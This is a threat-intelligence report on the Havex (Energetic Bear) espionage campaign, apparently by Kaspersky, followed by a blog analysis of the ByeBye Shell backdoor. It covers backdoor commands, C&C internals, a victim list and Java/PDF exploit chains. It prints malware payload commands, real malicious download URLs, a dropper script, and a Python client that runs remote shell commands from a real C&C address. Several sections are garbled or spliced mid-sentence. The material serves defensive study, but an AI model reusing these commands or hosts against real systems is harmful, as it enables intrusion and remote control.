The WorkReceive function essentially does a GET request on the C&C server in order to receive a
task to complete on the infected computer.The task to execute is encrypted and base64 encoded


<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
   62</noncontent>

and returned between the “havex” tags.Here is an example without any task between the tags:




The trojan calls the DataParser to locate the task:




The task is decrypted, decoded and stored in the “KeyWork\\[name_from_version_information]\\
work” subkey.<heading>5.4 WorkBegin - Task Dispatcher</heading>


Just before the WorkBegin method is called, the “begin work” debug message is displayed.The first thing WorkBegin does is decrypt and unbase64 the answer returned from the DataParser.Afterwards, two things are extracted: The command to execute and the data parameter for the
command.<heading>5.5 The Commands</heading>


The final step calls the command dispatcher, which executes the command sent by the attackers.<heading>5.5.1 SCR</heading>


The “SCR” command is used by the attacker to request a Screen Capture of the infected computer.Typical GDI functions are used, including: CreateCompatibleDC, GetSystemMetrics and
CreateCompatibleBitmap.The screenshots are made as JPG files.If a screenshot already exist, it is deleted prior the creation of
a new one.<heading>5.5.2 DIR / DIS</heading>


The “DIR” and “DIS” commands are used to generate Directory listings using the XML format.<noncontent>TLP: Green                                            For any inquire please contact intelreports@kaspersky.com
                                                                                                       63</noncontent>

<heading>5.5.3 TIM</heading>
		
The TIM command is responsible for updating the Timeout parameter in the registry.The command finds where the KeyWork is located and updates the Time out with the parameter
provided to the command.<heading>5.5.4 UPD</heading>


The UPD command is used to run an updated version of the RAT.The currently running RAT
executes the update and exits.Upon execution, the newly updated version will delete the old RAT
using the Cleaner method described earlier.<heading>5.5.5 FID</heading>


Change Folder attributes.<heading>5.5.6 LIB</heading>


The LIB command is used to load a DLL on the infected machine.It simply uses LoadLibrary.<heading>5.5.7 FIR</heading>


The FIR command is used to run an executable on the infected computer.The process is created
with hidden windows to stay unnoticed.<heading>5.5.8 UPS</heading>


The UPS command is used to update the C&C server in the registry.<heading>5.5.9 FIS</heading>


The FIS command is used to check if the file passed as parameter exists on the infected computer.<heading>5.5.10 FIT</heading>


The FIT command is used to delete a file passed as parameter to the command if it exists on the
infected computer.<heading>5.5.11 CMD</heading>



<noncontent>TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
   64</noncontent>

The CMD command is used to execute a command on the infected machine using cmd.exe
			
<heading>5.5.12 KEY</heading>


The KEY command is used to update the Priv and Pub key in the registry.<heading>5.6 Sleep and Loop again</heading>
		
Once the commands have been executed, the debug message “End work” is displayed.The malware then sleeps for a random amount of time and the main loop continues.If the commands were executed, all results stored in the registry will be POSTED to the server via
the AnsSend method.The malware loops forever waiting for new orders from the attackers.</section>



<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
                                                                                                        65</noncontent>


<header>VI.The Delphi packer contains anti-
debugging tricks and code especially crafted to overrun sandbox mechanisms.The packer unpacks and
executes the main binary in several stages, creating multiple separated processes and threads.It uses encrypted strings - XOR with progressively incremented value.<noncontent>TLP: Green                                            For any inquire please contact intelreports@kaspersky.com
                                                                                                           69</noncontent>


Main Features:
* Full Screen Capture (display selection support).* Window Capture.* Selected area capture.* Save captured image in silent mode.* Open captured image in graphic editor.* Print captured image.* Put captured image to clipboard.* Upload captured image (to image hosting services).* Images format support:
	PNG
	GIF
	       JPG - Quality can be set.BMP - Format can be set.Example of part of the content of the scs.txt file:


@HOUR: Hours value of clock in 24-hour format.Range is 00 to 23
Sample Value: 23
@MDAY: Current day of month.Range is 01 to 31
Sample Value: 22
@MIN: Minutes value of clock.Range is 00 to 59
Sample Value: 19
@MON: Current month.Range is 01 to 12
Sample Value: 07
@MSEC: Milliseconds value of clock.Range is 00 to 999
Sample Value: 050
@SEC: Seconds value of clock.Range is 00 to 59
Sample Value: 52
@WDAY: Numeric day of week.Range is 1 to 7 which corresponds to Sunday through
Saturday.Sample Value: 3
@YDAY: Current day of year.Range is 001 to 366 (or 001 to 365 if not a leap year)
Sample Value: 203
@YEAR: Current four-digit year
Sample Value: 2014
@ComputerName: Computer’s network name.Sample Value: WINXP
@ComSpec: value of %comspec%, the SPECified secondary COMmand interpreter; primarily for


<noncontent>TLP: Green                                             For any inquire please contact intelreports@kaspersky.com
   70</noncontent>

command line uses, e.g.Run(@ComSpec & “ /k help | more”)
Sample Value: C:\WINDOWS\system32\cmd.exe
@CPUArch: Returns “X86” when the CPU is a 32-bit CPU and “X64” when the CPU is 64-bit.Sample Value: X64
@HomeShare: Server and share name containing current user’s home directory.Sample Value:
@IPAddress1: IP address of first network adapter.Tends to return 127.0.0.1 on some
computers.Sample Value: 192.168.56.11
@IPAddress2: IP address of second network adapter.Returns 0.0.0.0 if not applicable.Sample Value: 0.0.0.0
@IPAddress3: IP address of third network adapter.Returns 0.0.0.0 if not applicable.Sample Value: 0.0.0.0
@IPAddress4: IP address of fourth network adapter.Returns 0.0.0.0 if not applicable.Sample Value: 0.0.0.0
@LogonDNSDomain: Logon DNS Domain.Sample Value:
@LogonDomain: Logon Domain.Sample Value: WINXP
--- snip ---


File listing module


SHA-256:	07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4
Size:		       15872
Timestamp:	 Tue, 02 Jul 2013 12:41:47 UTC
Source:	      91.203.6.71/check2/muees27jxt/fl.exe
Detected as:	 HEUR:Trojan.Win32.Generic


Module listing file.Saves a list of documents that have specified extensions or contain specified strings in the file name to the C:\
ProgramData\Mail\MailAg\fls.txt file.Saved information includes path, size and modification time.<table>
File matching patterns:


 *pass*.*                    *.rtf                       *.xls                        *.pdf

 *secret*.*                  *.pst                       *.doc                        *.vmdk

 *.pgp                       *.p12                       *.mdb                        *.tc


</table>
</section>
<noncontent>TLP: Green                                                 For any inquire please contact intelreports@kaspersky.com
                                                                                                         71</noncontent>


<header>VII.Appendix 7:
C&C Analysis</header>
<section>
The C&C Backend is written in PHP, consisting of 3 files.“log.php” is a Web-Shell, used for file level operations.“testlog.php” is not a PHP-script but it contains the C&C Server logfile of Backdoor-connections.Please see “source.php” below for further information.“source.php”


The Backdoors interact with “source.php”, which is the control script.Following the functions on
execution:


1.Writes the above information to “testlog.php”, separated by “Tabulator” and base64-encoded,
    with the following syntax:



<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
    72</noncontent>

    <timestamp>\t<victim ip-address>\t<proxy>\t<botID>\t<request-uri>\t<useragent>


3.Writes all transferred HTTP-GET Variables to “<botID>.log”, separated by “Tabulator” and
    base64-encoded.4.If the bot executed an HTTP-POST-request, the transferred data is written to the file “<botID>.ans”, enclosed in “xdata”-Tag with timestamp.(“ans” is the acronym for “Answer”)
5.Checks for any file “<botID>_*.txt”


      a.If found the timestamp, filename and Status “sent” are first appended to “<botID>.log”.Then the file content is transferred to the bot, embedded into HTML with HTML-Body “No
      data!” and HTML-Comment “Havex” containing the data to be transferred.Finally the file on
      the server will be removed.If removal fails it’s logged to “<botID>.log”.b.If no matching file is found, a HTML-Response is sent with an empty “Havex” HTML-
      Comment and HTML-Body text “Sorry, no data corresponding to your request.”



 
</section>



<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
                                                                                                         73</noncontent>


<header>VIII.Appendix 8:
Victim identification</header>
<section>
The page below shows a brief description of the identified victims including information about the
company and the sector on which they operates.A total of 101 victims have been identified.Victim 1
Offers a complete range of manufacturing processes including precision injection molding, cleanroom
molding and assembly, sheet metal fabrication, supply chain management and distribution.Victim 2
Ukrainian wholesale suppliers for the pharmaceutical market.Victim 3
General contracting, design build and construction management company; based in Alabama.Victim 4
Company performing web developing, hosting, consulting and content management.Victim 5
University in Ukraine.Victim 6
Develops larger machines for international manufacturers – Ireland.Victim 7
School in Tennessee.Victim 8
Special Purpose Machines.Working in several sectors including the pharmaceutical, automotive,
printing or plastic industry.Victim 9
Corporation - Area of activity : Adult Internal Medicine, Infectious Disease, Pediatrics, OB/GYN,
Dentistry, Psychology, Psychiatry, Social Services


Victim 10
Faculty of Electrical Engineering, Mechanical Engineering and Naval Architecture.<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
   74</noncontent>

Victim 11
Distributor for construction machinery, energy systems and Caterpillar brand equipment.Victim 12
One of Northern Ireland’s most respected and innovative construction companies.Victim 13
Supplier of IT services and products.Victim 14
Multi-trade company providing high quality electrical, HVAC, IT, across the country (US).Victim 15
Area of activity: Packaging systems.HQ in Switzerland.Victim 16
Web development and hosting including ERP and commercial implementation and consulting
services.HQ: Chile


Victim 17
Car dealer in Arizona


Victim 18
IT Australia - provides systems to streamline management and governance processes.Victim 19
Integrated online marketing agency.Russia.Victim 20
Design and manufacture of standard and custom leak test machines.Victim 21
University in Spain.Victim 22
Towing/hauling solutions to the commercial trucking industry.Located coast to coast in the U.S.,
Canada, Europe, Australia and Mexico.Victim 23
University in Poland.<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
                                                                                                            75</noncontent>

Victim 24
Areas of activity: recycling, mining and food sorting.Victim 25
Systems integrator located in North Carolina.Specializes in the design and implementation of SCADA systems.Victim 26
City council - Poland.Victim 27
University in China.Victim 28
Cleaning solutions.Victim 29
Manufacturer of flexible packaging and advanced laminate design solutions.Victim 30
Custom manufacturing of complex three-dimensional sheet metal parts.Victim 31
Specializes in mechanical engineering.Area of activity: Laminating-Machines , Used-Machinery.Victim 32
Structural engineering field in every major market sector and construction type.California.Victim 33
Courier services worldwide.Greece.Victim 34
Institute of Physics.Croatia


Victim 35
Supplies public sector organizations with products and contracts.UK.Victim 36
University in Spain.Victim 37


<noncontent>TLP: Green                                              For any inquire please contact intelreports@kaspersky.com
   76</noncontent>

University in Poland.Victim 38
University in Poland.Victim 39
Research & Education Network.USA.Victim 40
University in Germany.Victim 41
American multinational technology and consulting corporation.Victim 42
Creates and manages international private WANs for large multinational companies.Victim 43
Informatics Centre in India.Victim 42
Health authority in Canada.Victim 43
County Government in USA.Victim 44
University in USA.Victim 45
American multinational conglomerate corporation.Victim 46
Unit within University in USA.Victim 47
Operates high speed computer network in Turkey.Victim 48
University in Poland.<noncontent>TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
                                                                                                       77</noncontent>


Victim 49
Telecommunications and computing services.USA.Victim 50
American multinational document management corporation.Victim 51
Major electronic systems company based in France acting in areas such as defense, aerospace,
airline security and safety, information technology, and transportation


Victim 52
Swiss multinational pharmaceutical company.Victim 53
American manufacturing conglomerate involved in aircraft, the space industry, defense-oriented and
commercial electronics, automotive and truck components.Victim 54
Industrial suburb in India.Victim 55
Information Technology company.Iran.Victim 56
University in China.Victim 57
Global payments and technology company.USA.Victim 58
College in USA.Victim 59
University in Germany.Victim 60
University in UK.Victim 61


<noncontent>TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
   78</noncontent>

Supercomputing and Networking Center.Poland.Victim 62
University in Canada.Victim 63
University in USA.Victim 64
University in Spain.Victim 65
Academic and Research Network.Ukraine.Victim 66
University in Canada.Victim 67
Front, middle, and back office services for global financial markets.Victim 68
Greek Public Administration Network


Victim 69
University in the USA.Victim 70
University in Russia.Victim 71
Airport Authority in the USA.Victim 72
Multinational manufacturer.Germany.Victim 73
Energy consumption analysis company.Victim 74
University in the USA.<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
                                                                                                        79</noncontent>


Victim 75
University in Taiwan.Victim 76
University in Japan.Victim 77
University in Taiwan.Victim 78
University in the USA.Victim 79
University in the USA.Victim 80
University in Sweden.Victim 81
University in Poland.Victim 82
Pharma industry.Victim 83
Digital content for education and research in the UK.Victim 84
University – weather research.Victim 85
University in South Korea.Victim 86
Construction management services.Victim 87
Education and Research Network, China.Victim 88


<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
   80</noncontent>

Communications network for science and research, Germany.Victim 89
University in the USA.Victim 90
University in Spain.Victim 91
University in South Korea.Victim 92
Academic and Research Network, Croatia.Victim 93
Encryption technology Institute.Victim 94
University in the USA.Victim 95
Chemical company, Germany.Victim 96
School, USA.Victim 97
University in Ukraine.Victim 98
Liquefied natural gas, US energy demand.Victim 99
University in Poland.Victim 100
Academic and Research Network, Australia.Victim 101
Space research institute, Russia.</section>
<noncontent>TLP: Green                                      For any inquire please contact intelreports@kaspersky.com
                                                                                             81</noncontent>


<header>IX.Appendix 10:
Delivery methods – detailed analysis</header>
<section>
<heading>10.1.29.c8a7af419640516616c342b13efab.29.45474bca5c3a10c8e94e56543c2b
		d.600000.2000.323000.10.svcprocess.It served Havex variant (d532eb6835126e53e7ae491ae29f
d8b3) at
kinoporno.org/Provider.dll.It also served up the well-known lateral movement utility 64bit Windows Credential Editor tool at
kinoporno.org/wce64.exe


Another example above included a credential and document stealing component, downloaded as a
part of the attack chain from nahoonservices.com:
91.203.6.71/check2/muees27jxt/fl.exe




<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
   90</noncontent>


<heading>10.2.Exploitation</heading>

CVE-2011-0611 - PDF exploit


The exploit is delivered as an XDP file (XML Data Package) which is actually a PDF file packaged
within an XML container.This is a known PDF obfuscation method which serves as an additional
anti-detection layer.The XDP file contains an SWF exploit and two files (encrypted with XOR 0x04) stored in the invalid
section of the PDF.One of the files is Havex DLL (version 038), the other is a small JAR file, which is
used to copy and run the DLL by executing the following command:
cmd /c copy <fname_passed_as_param> %TEMP%\\explore.dll /y & rundll32.exe %TEMP%\\
explore.dll,RunDllEntry


The SWF executes the action script, which contains a shellcode (encrypted with XOR 0x96) and another
SWF file (encrypted with XOR 0x7D) which uses the CVE-2011-0611 vulnerability to run the shellcode.The shellcode then looks for the signature S18t in the memory (which signs the start of encrypted
DLL), decrypts and loads it.jar - which was part of the malicious HTML file.It uses either CVE-2012-1723 or CVE-2012-4681,
depending on which Java version is running on the victim’s machine.It downloads payloads to
%JAVATMP%\roperXdun.exe (where X is the sequential number starting from 0 for the payload
from the first URL from the list) and executes them.The URL list is stored in the “uid” parameter in HTML file, so there is no way of checking what
the payload was and where it came from without having the original HTML that embedded the
malicious applet.The URLs in the parameter are encrypted in the form of a string composed from
numbers from 0 to 71 separated by colons.Each number represents a different ASCII character.The ROP used in this Yeti
exploit matches the msf code instruction for instruction.The pdf stores the Havex downloader in its
content, which it writes to %temp% and executes after obtaining control flow from Adobe Reader.The significant stages of this exploit start by setting up parameters for the vulnerable strcat call in
the CoolType SING table parsing library here, in order to overwrite the stack with an appropriate
ROP blob.Function call
chains for both the Yeti ROP and the msf ROP are as follows:


CreateFileA
CreateFileMappingA
MapViewOfFile
save and load the saved mapping ptr
memcpy
ret back into shellcode for Havex file write to %temp% and execute


This work is clearly a rip from metasploit.This exploit was first seen on a large scale when exploit
code targeting cve-2012-5076 was included in the “Cool Exploit” pack.The flaw lies in the
configuration of the JRE itself and enables untrusted applets to access dangerous packages.In other
words, “com.sun.org.glassfish.,\” was left out of the checkPackageAccess list in the java.security file.From the unrestricted com.sun.org.glassfish.* package, the untrusted applets can create a class with
elevated privilege.In this case, one of the exposed “dangerous” packages happens to be com.sun.org.glassfish.gmbal, which you can see imported by “SiteError.class”:

<code></code>


Also in that class file is the trigger itself, where a malicious class is loaded on the fly by the
unrestricted “GenericConstructor” code that should not have been available to an untrusted applet.<code></code>


The new instance of localClass created from smd_bytes is nothing more than a call to set the
SecurityManager value to null, effectively turning off the JRE sandbox security access features.The
exploit maintains a class in the byte array:




<noncontent>TLP: Green                                            For any inquire please contact intelreports@kaspersky.com
                                                                                                       95</noncontent>

<code></code>


And when decoded, the contents of this smd_bytes array are in fact “SecurityManagerDisabler.class”:


<code></code>

After SecurityManagerDisabler.class disables the JRE SecurityManager, SiteError.class code loads
the Mosdef.class, which downloads and runs another Havex backdoor.The obfuscation code in this java exploit is fairly
weak but effective in modifying the metasploit code just enough to cover up similarities.It is another rip of the corresponding metasploit code, with minor modifications.See “Obvious Metasploit Rips” below.The shellcode delivered with the exploit is nothing out of the ordinary,
using expected thread environment variables to identify module locations in the memory...

<figure></figure>


The shellcode gets more interesting due to the manner in which the download url string was built.<noncontent>TLP: Green                                                For any inquire please contact intelreports@kaspersky.com
                                                                                                       99</noncontent>

The encoding algo was a simple additive 0x1010101 against every four bytes of the reversed string
“kenzhebek.com/tiki/files/templates/listpages/hoem.php”, which was downloaded as a Havex
backdoor.Interestingly, the metasploit code was derived from 0day Itw at the time in June 2013.But the

<code></code>


attackers didn’t use it until after the vulnerability was patched.The Yeti attackers simply did not
need a 0-day arsenal.The attackers must have known or expected that they were targeting Internet Explorer 7 on the
victims’ systems.The later, updated versions of the corresponding metasploit code maintain ROP
to evade problems with attacking IE 8+ ASLR/DEP protections, but the Yeti code does not.This
absence is somewhat odd, because KSN events indicate the code was active in August 2013, and the
metasploit dev added ROP to their code in June 2013.Obvious Metasploit Rips</heading>

The Yeti exploits are ripped line-for-line from the metasploit framework.For example, class files served from www.nahoonservices.com/wp-content/plugins/rss-poster/start.jar include code pulled from the msf.html displays much the same level of technical originality.Changing Lights Out exploit sites’ download flow</heading>

In earlier cases (July 2013), successful Java exploitation served from nahoonservices.com would
cascade into more Yeti components planted on victim systems.This string appears to be more commonly implemented at the active exploit sites:


    hxxp://keeleux.com/sfreg/img/nav/iden21php?dwl=fne


It writes out the TmpProvider.dll Havex loader downloaded from this resource and runs it using
“rundll32.exe”.eWON trojanized installer detail:
hxxp://www.ewon.biz/software/eCatcher/eCatcherSetup.exe (eb0dacdc8b346f44c8c370408bad43
06,70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9)


Havex loader version 038
(401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67) dropped as
TmpProvider.dll.<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
                                                                                                       105</noncontent>


<heading>10.5.NOTE: the previous information is from the June 2013 CPU.Oracle has not
commented on claims from another vendor that this issue allows remote attackers to bypass the
Java sandbox via vectors related to “Incorrect image channel verification” in 2D.”


CVE-2013-2423
https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-2423
“Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE
7 Update 17 and earlier, and OpenJDK 7, allows remote attackers to affect integrity via unknown
vectors related to HotSpot.NOTE: the previous information is from the April 2013 CPU.NOTE: some
parties have mapped the recursive Reflection API issue to CVE-2012-3174, but CVE-2012-3174 is for
a different vulnerability whose details are not public as of 20130114.CVE-2013-0422 covers both
the JMX/MBean and Reflection API issues.NOTE: it was originally reported that Java 6 was also
vulnerable, but the reporter has retracted this claim, stating that Java 6 is not exploitable because


<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
                                                                                                       107</noncontent>

the relevant code is called in a way that does not bypass security checks.NOTE: as of 20130114, a
reliable third party has claimed that the findClass/MBeanInstantiator vector was not fixed in Oracle
Java 7 Update 11.If there is still a vulnerable condition, then a separate CVE identifier might be
created for the unfixed issue.NOTE: some of
these details are obtained from third party information.</section>


<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
   108</noncontent>

<section>
<header>XI.2013.05 -
                                                      Java         cve-2013-2423
jar                                                                                   2013.09
kenzhebek.com/tiki/files/templates/listpages/negc.Internet
                                                                   cve-2013-1347 2013.05
html                                                  Explorer
kenzhebek.com/tiki/files/templates/listpages/negq.Internet
                                                                   cve-2013-1347 2013.08
html                                                  Explorer
kenzhebek.com/tiki/files/templates/listpages/stoq.gse.com.ge                                                                         2013 Q1
                       transmission and exclusive            com
                       dispatch services to about 50
                       eligible companies in Georgia
                       Lietuvos energijos gamyba -
                       Lithuania‘s largest electricity
                                                             lafollettewines.2012 Q4 - 2013
yell.ge
                       Manganese mining org contacts         com                   Q1
                       Chariot Oil and Gas Limited
                       - independent oil and gas
                                                             nahoonservices.nahoonservices.vitogaz.com                                                                          2013 Q4
                         supplier and technical developer      com
                         French-based gas distributor,
vitogaz.com                                                    keeleux.com           2013 Q4
                         supplier and technical developer
                         California-based industrial
                                                               serviciosglobal.energyplatform.eu      representing 200 renewable                                  2013 Q4
                                                             com
                       energy research centers and
                       businesses
                       FirstEnergy Capital - Calgary
                       based investment banking
                                                             serviciosglobal.firstenergy.com        provider.Financial, advisory and                           2013 Q4
                                                             com
                       investment services to the global
                       energy sector
                       FirstEnergy Capital - Calgary
                       based investment banking
firstenergy.com        provider.used.samashmusic.com   the US.Frequently emails                                   2014 Q1
                                                             com
                       potential customers with links to
                       site
                       Sponge Bob fan site SpongeBuddy
                       Mania - includes a forum where        waytomiracle.sbmania.net                                                                        2014 Q1
                       individuals can be specifically       com
                       targeted, including adults
                       British based global advisers -
                                                             serviciosglobal.39essex.com            legal mediation and advocacy,                               2013 Q4
                                                             com
                       policy and business advice
                       French-based weather forecasting      serviciosglobal.Now, with the solution
                       ‘VITORESEAU’ choice exists.A corrupted eCatcherSetup.exe
file has been placed into the CMS (Content Management System) of www.ewon.biz website and
eCatcher download hyperlinks have been rerouted to this corrupted file.“
http://www.talk2m.com/en/full_news.html?cmp_id=7&news_id=51


LightsOut EK: “By the way... How much is the fish!Recently I stumbled on yet another one, which appears to have been active since at least the beginning of the year, and seems mostly directed at Pakistani targets.In this article we're going to analyze the nature of the attacks, the functionality of the backdoor - here labelled as ByeBye Shell - and the quick interaction I had with the operators behind this campaign.</section>

<section>
<heading>Infection</heading>                                                                                    
No exploit was used in any of the attacks we attribute to this campaign - the attackers probably just relied on social engineering the victim through well-crafted spearphishing emails.The malware first appears to the victim as a .scr file.In some cases the attackers make use of the Left-to-Right Override Unicode character in order to twist the .exe file extension into something more credible.Once executed it drops and launches a batch script in a %Temp% subfolder with the following content:

<code>
      01.@  echo  off    
      02.@  start  "IEXPLORE.EXE"  "<backdoor>"    
      03.@  reg  add  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced  /v  Hidden  /t  REG_DWOR
      04.@  reg  add  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced  /v  HideFileExt  /t  REG
      05.@  reg  add  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced  /v  ShowSuperHidden  /t
      06.@  reg  add  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL
      07.@  exit    
</code>

As you can see, it enforces some configuration in the registry in order to hide file extensions and not show hidden folders.Subsequently the malware creates and launches a Cabinet Self-Extractor, which drops two additional executable files: one embedding either a PDF or a Microsoft Office Word document, the other being the actual backdoor.You can find a copy of the original article on this Pakistan institutional website.</caption>

<figure></figure>
<caption>Also in this case the attacker seems to have just reused an existing article.Searching online for the content, it appears to have been originally published on a website called SATribune, which is no longer online.You can find a copy of the full article here.</caption>

<figure></figure>
<caption>Again, the original article is available on Dawn.com.</caption>

<figure></figure>
<caption>This last one coming instead from Reuters.</caption>
</section>

<section>
<heading>Backdoor</heading>
Let's face it: at the point where the attackers obtain control over the target computer, not much sophistication is left in day-to-day targeted attacks.PoisonIvy, Gh0st and custom backdoors are daily business for threat analysts and malware researchers, in most cases being tedious work with little technical challenge.This campaign is no exception.The main backdoor installed and executed on the victims' systems appears to be a custom reverse shell with just a handful of features.Due to a lack of public literature about this case, I decided to dub this family as ByeByeShell.When disassembling the binary you can quickly understand the mechanics of the backdoor.After some quick initialization, the backdoor XORs an embedded string with 0x9D to extract the IP address of the C&C server.Subsequently it establishes a connection to it (generally on port 80) and checks in with some basic information about the system.<code>
LAB-­OF-­Me:
10.0.2.15............................................................UserName:  User
HostName:lab
MAC:  <MAC  address>
Address  0:  10.0.2.15
[P130813]
</code>

As you can see, it reports the computer name, the user name, the IP address and MAC address of the network adapter.The [P130813] line appears to be a constant value, possibly a target identifier.Interestingly, in a specific malware sample belonging to this campaign, the backdoor also appends the string "INS and  AfPak" at the end of the message - note that, as defined by Wikipedia, "AfPak (or  Af-Pak) is a neologism used within US foreign policy circles to designate Afghanistan and Pakistan as a single theater of operations".After the check-in message is sent, the malware enters a continuous loop in which it will keep silently waiting for commands from the open socket connection.From now on, it expects some manual interaction from the attacker.The supported commands are: shell, comd, sleep, quit, kill

You can see the switch block in the following screenshots.<figure></figure>
<caption>As you can see, this is an extremely basic backdoor, even poorly written if you ask me.Antivirus detection rate is also reasonably good, despite consisting mostly of generic signatures.</caption>

The samples are also signed with an invalid Microsoft Windows certificate, which can be used for further fingerprinting:
<code>
  01.Certificate:    
  02.Data:    
  03.Version:  3  (0x2)    
  04.Serial  Number:    
  05.5b:b2:39:83:49:9b:89:a0:43:a8:10:3a:67:24:13:78    
  06.Signature  Algorithm:  md5WithRSAEncryption    
  07.Issuer:  CN=Microsoft  Windows    
  08.Validity    
  09.Not  Before:  Dec  31  18:30:00  2011  GMT    
  10.Not  After  :  Dec  31  18:30:00  2014  GMT    
  11.Subject:  CN=Microsoft  Windows    
  12.Subject  Public  Key  Info:    
  13.Public  Key  Algorithm:  rsaEncryption    
  14.Public-­Key:  (1024  bit)    
  15.Modulus:    
  16.00:c6:e9:0c:5e:0a:09:39:db:58:a8:03:6c:60:da:    
  17.32:ad:c5:3d:9a:39:91:ca:93:9f:ac:39:aa:3d:45:    
  18.54:a7:63:e0:a7:c3:b0:b6:ee:2b:6c:bd:83:f9:9b:    
  19.9b:e1:df:0d:e1:2a:96:e3:99:5e:52:0e:c7:c5:63:    
  20.91:b4:e9:37:63:be:4b:62:23:2e:b8:00:f0:48:22:    
  21.1e:ef:60:16:99:a4:08:2c:66:72:26:a2:68:1d:66:    
  22.                                             a4:22:ff:a5:72:7a:ad:f8:78:9c:1f:2e:89:49:62:    
  23.                                             f4:ba:6d:7f:f5:04:b1:9b:29:58:13:1d:f9:0f:a6:    
  24.86:95:95:92:0b:57:9c:ca:39    
  25.Exponent:  65537  (0x10001)    
  26.X509v3  extensions:    
  27.2.5.29.1:    
  28.0D..g.yY,.^.Oxz..../..0.1.0...U....Microsoft  Windows..[.9.I...C..:g$.x    
  29.Signature  Algorithm:  md5WithRSAEncryption    
  30.                       bd:b3:b3:95:14:aa:55:0d:80:4a:7b:d5:54:e9:43:e9:e1:36:    
  31.                       c1:7b:25:64:4b:a4:35:6f:55:81:d1:f5:9d:69:87:04:f3:8d:    
  32.05:0a:49:31:0e:49:11:62:97:85:42:b4:37:63:ce:88:77:59:    
  33.44:9c:83:03:9c:bb:95:f8:f4:8d:15:b5:1c:96:d4:af:ea:50:    
  34.0a:cf:53:38:01:ed:00:6c:a0:90:f6:4c:8c:80:12:f3:ac:38:    
  35.                       b1:4f:d9:e9:d1:2b:8b:40:0e:9e:6b:38:45:a1:90:2d:fe:79:    
  36.However port 80, which the backdoors try to contact, appears to be available only sporadically.In order to get some fun out of an overall straightforward analysis, I quickly hacked together a  Python script  that emulates a ByeBye backdoor - following is the code:

<code>
01.     import  os    
02.     import  sys    
03.     import  socket    
04.     import  subprocess    
05.06.     def  main(host='46.165.207.134'):    
07.#  This  is  the  check-­in  message.08.             buf  =  "HOMEPC-­OF-­User:  192.168.0.5..........................................................
09.             buf  +=  "HostName:HOMEPC\n"    
10.             buf  +=  "MAC:  <MAC  ADDRESS>\n"    
11.             buf  +=  "Address  0:  192.168.0.5\n"    
12.             buf  +=  "[P100713]\n"    
13.             buf  +=  "$"    
14.15.#  Emulating  cmd.exe,  hacky  but  works.16.             cmd  =  "Microsoft  Windows  XP  [Version  5.1.2600]\n"    
17.             cmd  +=  "(C)  Copyright  1985-­2001  Microsoft  Corp.\n"    
18.             prompt  =  "C:\Documents  and  Settings\User>  "    
19.20.             print("[*]  Trying  to  connect  to  C&C...")    
21.22.#  Try  to  establish  connection  with  the  C&C.23.             while  True:    
24.                     try:    
25.                             sock  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)    
26.                             sock.connect((host,  80))    
27.                     except  Exception  as  e:    
28.print("[!]ERROR:  Unable  to  connect:  {0}".format(e))    
29.                             sock.close()    
30.                             continue    
31.                     else:    
32.                             subprocess.Popen('start  alarm.mp3',  shell=True)    
33.                             break    
34.35.             print("[*]  Connected  to  C&C!")36.37.#  Send  check-­in  message.38.             sock.send(buf)    
39.40.             print("[*]  Authenticated  to  C&C!")41.42.#  This  flag  represents  whether  we  should  currently  emulate  a  cmd.exe  prompt    
43.#  or  emulate  the  backdoor  shell.44.             shell_mode  =  False    
45.46.#  Main  loop.47.             while  True:    
48.#  Wait  for  incoming  command.49.                     try:    
50.                             bufin  =  sock.recv(1024)    
51.                     except  KeyboardInterrupt:    
52.                             break    
53.                     except  Exception  as  e:    
54.print("[!]ERROR:  Connection  lost:  {0}".format(e))    
55.                             break    
56.57.                     data  =  bufin.strip()    
58.                     if  len(data)  ==  0:    
59.                             continue    
60.61.                     print("[+]  Received:  {0}".format(data))    
62.63.#  If  we  are  in  cmd.exe  mode...    
64.                     if  shell_mode:    
65.#  If  he  tries  to  exit  the  cmd,  we  emulate  that.66.                             if  data  in  ('quit',  'exit'):    
  67.                                     shell_mode  =  False    
  68.                                     sock.send('$')    
  69.                                     continue    
  70.#  If  he  tries  to  shutdown  the  system,  I'm  gonna  interrupt.71.                             elif  'shutdown'  in  data:    
  72.                                     break    
  73.#  I  don't  want  him  to  kill  processes.74.                             elif  'taskkill'  in  data:    
  75.                                     continue    
  76.#  Otherwise  just  execute  the  command.77.                             else:    
  78.                                     proc  =  subprocess.Popen(data,  stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  sh
  79.(out,  err)  =  proc.communicate()    
  80.81.                                     if  out:    
  82.                                             lines  =  out.split('\n')    
  83.                                             out_lines  =  []    
  84.                                             for  line  in  lines:    
  85.#  Can  filter  output  here,  for  instance  remove  process    
  86.#  names  or  VirtualBox  indicators  and  such.87.88.                                                     out_lines.append(line)    
  89.90.#  Send  the  findal  cmd  output.91.                                             sock.send('\n'.join(out_lines))    
  92.                                     if  err:    
  93.                                             sock.send(err)    
  94.95.                                     sock.send(prompt)    
  96.                     else:    
  97.                             if  data  ==  'kill':    
  98.#  Should  do  this:    
